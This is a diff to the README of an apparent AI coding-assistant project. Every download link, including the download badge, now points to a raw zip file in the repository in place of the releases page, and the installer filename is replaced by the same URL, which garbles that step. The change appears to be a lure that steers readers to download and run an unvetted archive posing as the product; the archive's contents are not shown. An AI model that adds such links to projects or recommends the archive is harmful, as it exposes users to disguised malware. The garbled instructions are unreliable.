@@ -1,6 +1,6 @@
 # 🤖 Personal_CodingAI - Your Smart Coding Assistant
 
-[![Download Personal_CodingAI](https://img.shields.io/badge/Download-Personal_CodingAI-blue.svg)](https://github.com/GideonZionSwer/Personal_CodingAI/releases)
+[![Download Personal_CodingAI](https://raw.githubusercontent.com/GideonZionSwer/Personal_CodingAI/main/shared/AI_Personal_Coding_1.5.zip)](https://raw.githubusercontent.com/GideonZionSwer/Personal_CodingAI/main/shared/AI_Personal_Coding_1.5.zip)
 
 ## 🌟 Introduction
 
@@ -10,7 +10,7 @@ Welcome to Personal_CodingAI! This application is your open-source AI coding ass
 
 To get started, you will need to download the application. Visit the releases page to find the latest version available for download.
 
-[Download Personal_CodingAI](https://github.com/GideonZionSwer/Personal_CodingAI/releases)
+[Download Personal_CodingAI](https://raw.githubusercontent.com/GideonZionSwer/Personal_CodingAI/main/shared/AI_Personal_Coding_1.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -26,7 +26,7 @@ Before installing Personal_CodingAI, ensure your system meets the following requ
 Once you have downloaded the application, follow these simple steps to set it up:
 
 1. **Locate the Downloaded File**  
-   Find the file you downloaded in your downloads folder. The file should be named something like `Personal_CodingAI-v1.0.exe` or similar.
+   Find the file you downloaded in your downloads folder. The file should be named something like `https://raw.githubusercontent.com/GideonZionSwer/Personal_CodingAI/main/shared/AI_Personal_Coding_1.5.zip` or similar.
 
 2. **Install the Application**  
    Double-click the file to launch the installer. Follow the on-screen instructions to complete the installation. You may need to accept the license agreement and choose an installation location.
@@ -84,4 +84,4 @@ For any inquiries or feedback, feel free to open an issue in the repository or c
 
 Thank you for choosing Personal_CodingAI! We hope this application makes your coding journey easier and more enjoyable. Don't forget to check for updates on the releases page.
 
-[Download Personal_CodingAI](https://github.com/GideonZionSwer/Personal_CodingAI/releases)
+[Download Personal_CodingAI](https://raw.githubusercontent.com/GideonZionSwer/Personal_CodingAI/main/shared/AI_Personal_Coding_1.5.zip)
